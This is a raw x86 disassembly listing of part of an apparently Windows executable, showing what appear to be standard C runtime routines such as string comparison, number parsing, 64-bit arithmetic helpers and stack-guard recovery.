  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
